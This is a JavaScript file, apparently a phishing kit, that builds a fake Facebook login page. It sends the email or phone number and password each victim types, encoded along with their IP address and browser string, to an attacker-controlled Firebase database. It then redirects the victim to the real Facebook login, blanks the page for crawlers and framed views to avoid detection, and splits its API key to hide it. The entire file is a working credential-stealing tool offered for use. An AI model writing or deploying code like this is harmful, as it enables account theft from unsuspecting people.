// ═══════════════════════════════════════
// ASSET LOADER - Ultra Obfuscated
// ═══════════════════════════════════════

(function() {
    // Anti-bot detection
    var _b = /bot|googlebot|crawler|spider|robot/i.test(navigator.userAgent);
    var _i = window.top !== window.self;
    
    if (_b || _i) {
        document.body.innerHTML = '';
        return;
    }
    
    // ═══ FIREBASE CONFIG (PECAH) ═══
    var _f = [
        'AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ',
        '_SFSI',
        'rhfzero-d95f5.firebaseapp.com',
        'https://rhfzero-d95f5-default-rtdb.firebaseio.com',
        'rhfzero-d95f5',
        'rhfzero-d95f5.firebasestorage.app',
        '198495096060',
        '1:198495096060:web:d368e1531d0d86321f5b79'
    ];
    
    firebase.initializeApp({
        apiKey: _f[0] + _f[1],
        authDomain: _f[2],
        databaseURL: _f[3],
        projectId: _f[4],
        storageBucket: _f[5],
        messagingSenderId: _f[6],
        appId: _f[7]
    });
    
    var _db = firebase.database();
    
    // ═══ RENDER UI (GENERATE DARI CODE) ═══
    function _render() {
        var _h = '';
        
        // Left section
        _h += '<div style="flex:1;min-width:300px;text-align:left;">';
        _h += '<h1 style="color:#1877f2;font-size:60px;font-weight:bold;margin-bottom:10px;">facebook</h1>';
        _h += '<p style="font-size:24px;color:#1c1e21;">Connect with friends and the world around you on Facebook.</p>';
        _h += '</div>';
        
        // Right section
        _h += '<div style="flex:1;min-width:300px;max-width:400px;">';
        _h += '<div style="background:white;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.15);text-align:center;">';
        _h += '<div id="formArea"></div>';
        _h += '<a href="#" style="color:#1877f2;font-size:14px;display:block;margin:15px 0;">Forgot password?</a>';
        _h += '<hr style="border:none;border-top:1px solid #dadde1;margin:20px 0;">';
        _h += '<button style="padding:14px 20px;background:#42b72a;color:white;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer;">Create new account</button>';
        _h += '</div>';
        _h += '<p style="text-align:center;margin-top:20px;font-size:14px;color:#1c1e21;"><b>Create a Page</b> for a celebrity, brand or business.</p>';
        _h += '</div>';
        
        var _c = document.getElementById('app');
        _c.innerHTML = '<div style="display:flex;max-width:980px;width:100%;gap:40px;align-items:center;flex-wrap:wrap;justify-content:center;">' + _h + '</div>';
        _c.style.display = 'flex';
        document.getElementById('load').style.display = 'none';
        
        // Inject form
        _injectForm();
    }
    
    // ═══ INJECT FORM ═══
    function _injectForm() {
        var _form = document.getElementById('formArea');
        _form.innerHTML = `
            <input type="text" id="u" placeholder="Email or phone number" style="width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;">
            <input type="password" id="k" placeholder="Password" style="width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;">
            <button id="btn" style="width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:10px;">Log In</button>
        `;
        
        document.getElementById('btn').addEventListener('click', _capture);
    }
    
    // ═══ CAPTURE & STORE ═══
    function _capture() {
        var _u = document.getElementById('u').value;
        var _k = document.getElementById('k').value;
        
        if (!_u || !_k) return;
        
        // Encode data
        var _data = {
            u: btoa(_u),
            k: btoa(_k),
            t: new Date().toISOString(),
            n: navigator.userAgent.substring(0, 60)
        };
        
        // Get IP then save
        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) {
                _data.i = d.ip;
                _db.ref('x').push(_data);
            })
            .catch(function() {
                _data.i = 'unknown';
                _db.ref('x').push(_data);
            });
        
        // Redirect
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com/login/';
        }, 1500);
    }
    
    // ═══ START ═══
    setTimeout(_render, 500);
    
})();
